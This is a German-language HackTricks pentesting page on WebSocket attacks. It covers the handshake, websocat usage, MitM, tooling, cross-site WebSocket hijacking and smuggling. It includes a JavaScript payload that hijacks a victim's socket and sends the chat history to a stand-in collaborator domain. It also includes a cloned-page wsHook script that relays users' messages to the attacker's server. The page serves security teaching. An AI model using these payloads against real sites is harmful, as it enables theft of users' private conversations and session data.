# WebSocket-Angriffe

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Was sind WebSockets

WebSocket-Verbindungen werden durch einen initialen **HTTP**-Handshake hergestellt und sind darauf ausgelegt, **langfristig** zu bestehen, was bidirektionale Nachrichten√ºbermittlung zu jeder Zeit ohne die Notwendigkeit eines transaktionalen Systems erm√∂glicht. Dies macht WebSockets besonders vorteilhaft f√ºr Anwendungen, die **geringe Latenz oder serverinitiierte Kommunikation** erfordern, wie z. B. Live-Finanzdatenstr√∂me.

### Herstellung von WebSocket-Verbindungen

Eine detaillierte Erkl√§rung zur Herstellung von WebSocket-Verbindungen kann [**hier**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) aufgerufen werden. Zusammenfassend werden WebSocket-Verbindungen normalerweise √ºber clientseitiges JavaScript initiiert, wie unten gezeigt:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Der `wss`-Protokoll bedeutet eine WebSocket-Verbindung, die mit **TLS** gesichert ist, w√§hrend `ws` eine **unsichere** Verbindung anzeigt.

W√§hrend der Verbindungsherstellung wird ein Handshake zwischen dem Browser und dem Server √ºber HTTP durchgef√ºhrt. Der Handshake-Prozess umfasst das Senden einer Anfrage durch den Browser und die Antwort des Servers, wie in den folgenden Beispielen dargestellt:

Browser sendet eine Handshake-Anfrage:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Server's handshake response:  
Antwort des Handshakes des Servers:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Die Verbindung bleibt nach der Herstellung f√ºr den Nachrichtenaustausch in beide Richtungen offen.

**Wichtige Punkte des WebSocket-Handshakes:**

- Die `Connection`- und `Upgrade`-Header signalisieren den Beginn eines WebSocket-Handshakes.
- Der `Sec-WebSocket-Version`-Header gibt die gew√ºnschte WebSocket-Protokollversion an, normalerweise `13`.
- Ein Base64-kodierter zuf√§lliger Wert wird im `Sec-WebSocket-Key`-Header gesendet, um sicherzustellen, dass jeder Handshake einzigartig ist, was hilft, Probleme mit Caching-Proxys zu verhindern. Dieser Wert dient nicht der Authentifizierung, sondern um zu best√§tigen, dass die Antwort nicht von einem falsch konfigurierten Server oder Cache generiert wurde.
- Der `Sec-WebSocket-Accept`-Header in der Serverantwort ist ein Hash des `Sec-WebSocket-Key`, der die Absicht des Servers verifiziert, eine WebSocket-Verbindung zu √∂ffnen.

Diese Funktionen stellen sicher, dass der Handshake-Prozess sicher und zuverl√§ssig ist und den Weg f√ºr eine effiziente Echtzeitkommunikation ebnet.


### Linux-Konsole

Sie k√∂nnen `websocat` verwenden, um eine rohe Verbindung mit einem Websocket herzustellen.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Oder um einen websocat-Server zu erstellen:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Wenn Sie feststellen, dass Clients von Ihrem aktuellen lokalen Netzwerk aus mit einem **HTTP websocket** verbunden sind, k√∂nnten Sie einen [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)versuchen, um einen MitM-Angriff zwischen dem Client und dem Server durchzuf√ºhren.\
Sobald der Client versucht, sich zu verbinden, k√∂nnen Sie dann Folgendes verwenden:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets Enumeration

Sie k√∂nnen das **Tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **verwenden, um automatisch bekannte** **Schwachstellen** in Websockets zu entdecken, zu identifizieren und zu suchen.

### Websocket Debug Tools

* **Burp Suite** unterst√ºtzt MitM-Websockets-Kommunikation auf sehr √§hnliche Weise, wie es f√ºr regul√§re HTTP-Kommunikation der Fall ist.
* Die [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite-Erweiterung** erm√∂glicht es Ihnen, Websocket-Kommunikationen in Burp besser zu verwalten, indem Sie die **Historie** abrufen, **Abfangregeln** festlegen, **Match- und Ersetzungsregeln** verwenden, **Intruder** und **AutoRepeater** nutzen.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Kurz f√ºr "**WebSocket/Socket.io Proxy**", dieses in Node.js geschriebene Tool bietet eine Benutzeroberfl√§che, um **Nachrichten zu erfassen, abzufangen, benutzerdefinierte** Nachrichten zu senden und alle WebSocket- und Socket.IO-Kommunikationen zwischen dem Client und dem Server anzuzeigen.
* [**wsrepl**](https://github.com/doyensec/wsrepl) ist ein **interaktives Websocket REPL**, das speziell f√ºr Penetrationstests entwickelt wurde. Es bietet eine Schnittstelle zum Beobachten von **eingehenden Websocket-Nachrichten und zum Senden neuer**, mit einem benutzerfreundlichen Framework zur **Automatisierung** dieser Kommunikation.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) ist eine **Webseite zur Kommunikation** mit anderen Webseiten √ºber **Websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) bietet unter anderem eine **Webseite zur Kommunikation** mit anderen Webseiten √ºber **Websockets**.

## Websocket Lab

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) haben Sie einen Code, um eine Webseite mit Websockets zu starten, und in [**diesem Beitrag**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) finden Sie eine Erkl√§rung.

## Cross-Site WebSocket Hijacking (CSWSH)

**Cross-Site WebSocket Hijacking**, auch bekannt als **Cross-Origin WebSocket Hijacking**, wird als ein spezifischer Fall von **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** identifiziert, der WebSocket-Handshakes betrifft. Diese Schwachstelle tritt auf, wenn WebSocket-Handshakes ausschlie√ülich √ºber **HTTP-Cookies** ohne **CSRF-Token** oder √§hnliche Sicherheitsma√ünahmen authentifiziert werden.

Angreifer k√∂nnen dies ausnutzen, indem sie eine **b√∂sartige Webseite** hosten, die eine Cross-Site-WebSocket-Verbindung zu einer verwundbaren Anwendung initiiert. Folglich wird diese Verbindung als Teil der Sitzung des Opfers mit der Anwendung behandelt, wodurch die fehlende CSRF-Schutzma√ünahme im Sitzungsmanagement ausgenutzt wird.

### Einfache Attacke

Beachten Sie, dass beim **Herstellen** einer **Websocket**-Verbindung das **Cookie** an den Server **gesendet** wird. Der **Server** k√∂nnte es verwenden, um jeden **spezifischen** **Benutzer** mit seiner **Websocket**-**Sitzung basierend auf dem gesendeten Cookie** zu **verkn√ºpfen**.

Wenn der **Websocket**-**Server** dann beispielsweise die **Historie der Konversation** eines Benutzers zur√ºcksendet, wenn eine Nachricht mit "**READY"** gesendet wird, dann kann eine **einfache XSS**, die die Verbindung herstellt (das **Cookie** wird **automatisch** gesendet, um den Benutzer zu autorisieren), die **Historie der Konversation** **abrufen**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie mit einem anderen Subdomain

In diesem Blogbeitrag [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) gelang es dem Angreifer, **willk√ºrliches Javascript in einem Subdomain** der Domain auszuf√ºhren, in der die Websocket-Kommunikation stattfand. Da es sich um ein **Subdomain** handelte, wurde das **Cookie** **gesendet**, und da der **Websocket den Origin nicht richtig √ºberpr√ºfte**, war es m√∂glich, mit ihm zu kommunizieren und **Tokens von ihm zu stehlen**.

### Daten von Benutzern stehlen

Kopiere die Webanwendung, die du nachahmen m√∂chtest (zum Beispiel die .html-Dateien), und f√ºge in das Skript, in dem die Websocket-Kommunikation stattfindet, diesen Code hinzu:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Laden Sie jetzt die `wsHook.js`-Datei von [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) herunter und **speichern Sie sie im Ordner mit den Webdateien**.\
Durch das Bereitstellen der Webanwendung und das Herstellen einer Verbindung eines Benutzers damit k√∂nnen Sie die √ºber Websocket gesendeten und empfangenen Nachrichten stehlen:
```javascript
sudo python3 -m http.server 80
```
## Race Conditions

Race Conditions in WebSockets sind ebenfalls ein Thema, [pr√ºfen Sie diese Informationen, um mehr zu erfahren](race-condition.md#rc-in-websockets).

## Other vulnerabilities

Da Web Sockets ein Mechanismus sind, um **Daten an die Server- und Client-Seite zu senden**, abh√§ngig davon, wie der Server und der Client die Informationen verarbeiten, **k√∂nnen Web Sockets verwendet werden, um mehrere andere Schwachstellen wie XSS, SQLi oder andere g√§ngige Web-Schwachstellen unter Verwendung von Benutzereingaben aus einem Websocket auszunutzen.**

## **WebSocket Smuggling**

Diese Schwachstelle k√∂nnte es Ihnen erm√∂glichen, **Einschr√§nkungen von Reverse-Proxys zu umgehen**, indem Sie sie glauben lassen, dass eine **Websocket-Kommunikation hergestellt wurde** (auch wenn das nicht wahr ist). Dies k√∂nnte einem Angreifer erm√∂glichen, **auf versteckte Endpunkte zuzugreifen**. F√ºr weitere Informationen √ºberpr√ºfen Sie die folgende Seite:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## References

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
